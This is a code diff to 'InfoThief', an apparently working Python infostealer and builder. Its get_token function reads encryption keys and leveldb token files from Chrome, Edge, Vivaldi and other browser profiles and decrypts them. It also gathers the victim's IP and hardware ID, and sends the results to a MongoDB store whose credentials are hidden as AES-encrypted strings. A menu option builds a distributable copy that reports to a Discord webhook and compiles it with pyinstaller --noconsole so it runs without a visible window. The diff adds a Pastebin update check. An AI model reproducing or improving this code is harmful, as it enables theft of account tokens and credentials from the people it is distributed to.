@@ -5,10 +5,9 @@ from base64 import b64decode
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 from os import getlogin, listdir, makedirs, path
-from json import loads
+from json import loads, load
 from re import findall
 from urllib.request import Request, urlopen
-from subprocess import Popen, PIPE
 import requests
 import json
 from datetime import datetime
@@ -20,6 +19,20 @@ from colorama import Fore, Style, init  # For colored output
 # Initialize colorama
 init(autoreset=True)
 
+def load_version():
+    """Loads the current version from version.json file."""
+    try:
+        with open('version.json', 'r') as version_file:
+            version_data = load(version_file)
+            return version_data.get("version", "Unknown")
+    except FileNotFoundError:
+        print(Fore.RED + "❌ version.json not found.")
+        return "Unknown"
+
+CURRENT_VERSION = load_version()  # Load the version from version.json
+UPDATE_URL = "https://pastebin.com/raw/1aDN9pnp"  # Use your actual Pastebin URL here
+
+# MongoDB and config setup
 encrypted_string_b64_1 = "p4jFiPnbfyQwSOOQQzg3riJnNBLKK+bxSkcfqr11JMjz9mk/PtY+AYvX+nXpfNo3"
 key_b64_1 = "zzmfymnu0BPZffUtXSGwNg=="
 
@@ -29,7 +42,6 @@ key_b64_2 = "ZEF/BmFRaA5LUh3lUv0Agw=="
 def decrypt_string(encrypted_string, key):
     encrypted_bytes = b64decode(encrypted_string)
     key_bytes = b64decode(key)
-    
     cipher = AES.new(key_bytes, AES.MODE_ECB)
     decrypted_string = cipher.decrypt(encrypted_bytes).decode('utf-8').strip()
     return decrypted_string
@@ -48,8 +60,6 @@ if config:
     mongo_uri = config['mongo_uri']
     db_name = config['db_name']
     collection_name = config['collection_name']
-
-    # Initialize MongoDB connection
     mongo_client = MongoClient(mongo_uri)
     db = mongo_client[db_name]
     collection = db[collection_name]
@@ -70,15 +80,14 @@ def decrypt(buff, master_key):
         return "Error"
 
 def getip():
-    ip = "None"
     try:
         ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
     except:
-        pass
+        ip = "None"
     return ip
 
 def gethwid():
-    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    p = subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
 
 def get_token():
@@ -102,7 +111,7 @@ def get_token():
         'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
         'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
         'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
-        'Chrome': chrome + 'Default',
+        'Chrome': chrome + '\\Default',
         'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
         'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
         'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
@@ -115,12 +124,12 @@ def get_token():
         if not os.path.exists(path): 
             continue
         try:
-            with open(path + f"\\Local State", "r") as file:
+            with open(path + "\\Local State", "r") as file:
                 key = loads(file.read())['os_crypt']['encrypted_key']
         except: 
             continue
 
-        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
+        for file in listdir(path + "\\Local Storage\\leveldb\\"):
             if not file.endswith(".ldb") and not file.endswith(".log"): 
                 continue
 
@@ -197,8 +206,8 @@ def get_token():
                         }
 
 def compile_script(filename):
-    """Compiles the Python script into an EXE."""
-    process = Popen(['pyinstaller', '--onefile', filename], stdout=PIPE, stderr=PIPE)
+    print(Fore.YELLOW + "📦 Compiling script to exe...")
+    process = subprocess.Popen(['pyinstaller', '--onefile', '--noconsole', filename], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     stdout, stderr = process.communicate()
     if process.returncode == 0:
         print(Fore.GREEN + "✅ Script compiled successfully!")
@@ -213,25 +222,46 @@ def display_header():
     """Displays the ASCII art header."""
     ascii_art = pyfiglet.figlet_format("InfoThief")
     print(Fore.CYAN + ascii_art)
-    print(Fore.MAGENTA + Style.BRIGHT + "Welcome to InfoThief - A Tool for Information Gathering 🕵️‍♂️")
-    print(Fore.LIGHTYELLOW_EX + Style.DIM + "Gather and analyze information from multiple platforms in one place.\n")
+    print(Fore.MAGENTA + Style.BRIGHT + f"Welcome to InfoThief - A Tool for Information Gathering 🕵️‍♂️")
+    print(Fore.LIGHTYELLOW_EX + Style.DIM + f"Author: BigglesDevs❤️ | Version: {CURRENT_VERSION} | Development: Active\n")
+
+def check_for_updates():
+    """Check if a new version of InfoThief is available."""
+    try:
+        response = requests.get(UPDATE_URL)
+        if response.status_code == 200:
+            update_info = response.json()
+            latest_version = update_info.get("version")
+            if latest_version and latest_version != CURRENT_VERSION:
+                print(Fore.LIGHTCYAN_EX + f"🚨 New version available: {latest_version} (Current version: {CURRENT_VERSION})")
+                print(Fore.LIGHTGREEN_EX + f"🔗 Download the latest version here: {update_info.get('download_url')}")
+            else:
+                print(Fore.GREEN + "✅ You are using the latest version of InfoThief.")
+        else:
+            print(Fore.RED + "❌ Failed to check for updates. Server returned an error.")
+    except Exception as e:
+        print(Fore.RED + f"Error while checking for updates: {e}")
 
 def display_menu():
     """Displays the options menu."""
     print(Fore.YELLOW + Style.BRIGHT + "Select an option:")
     print(Fore.GREEN + "1. Test InfoThief (On Self) 🛠️")
     print(Fore.GREEN + "2. Create InfoThief (Distribute) 🚀")
-    print(Fore.GREEN + "3. Exit 🛑")
+    print(Fore.GREEN + "3. Check for Updates 🔄")
+    print(Fore.GREEN + "4. Exit 🛑")
 
 # Main function to handle the options
-if __name__ == "__main__":
+def main():
     clear_console()
     display_header()
-    display_menu()
+    check_for_updates()  # Check for updates at startup
 
-    option = input(Fore.WHITE + "Enter your choice (1, 2, or 3): ")
+    display_menu()  # Display menu once
+    option = input(Fore.WHITE + "Enter your choice (1, 2, 3, or 4): ")
 
     if option == "1":
+        clear_console()
+        display_header()
         # Option 1 - Test
         user_data = get_token()
         if user_data:
@@ -276,7 +306,12 @@ if __name__ == "__main__":
             except Exception as e:
                 print(Fore.RED + f"Failed to save data to MongoDB: {e}")
 
+        print(Fore.LIGHTCYAN_EX + "Goodbye! 👋 Exiting...")
+        sys.exit(0)  # Exit the script after running option 1
+
     elif option == "2":
+        clear_console()
+        display_header()
         webhook_url = input("Please enter your Discord webhook URL: ")
         filename = input("What would you like to name the generated script? (without .py): ")
         filename += ".py"
@@ -302,9 +337,27 @@ if __name__ == "__main__":
                 compile_thread.start()
                 compile_thread.join()
 
+            print(Fore.LIGHTCYAN_EX + "Goodbye! 👋 Exiting...")
+            sys.exit(0)  # Exit the script after running option 2
+
         except Exception as e:
             print(Fore.RED + f"Error creating script from Pastebin: {e}")
 
     elif option == "3":
+        clear_console()
+        display_header()
+        check_for_updates()  # Manually check for updates
+
         print(Fore.LIGHTCYAN_EX + "Goodbye! 👋 Exiting...")
-        sys.exit(0)
+        sys.exit(0)  # Exit the script after checking updates
+
+    elif option == "4":
+        print(Fore.LIGHTCYAN_EX + "Goodbye! 👋 Exiting...")
+        sys.exit(0)  # Exit the script
+
+    else:
+        print(Fore.RED + "Invalid option. Exiting...")
+        sys.exit(0)  # Exit the script if an invalid option is selected
+
+if __name__ == "__main__":
+    main()
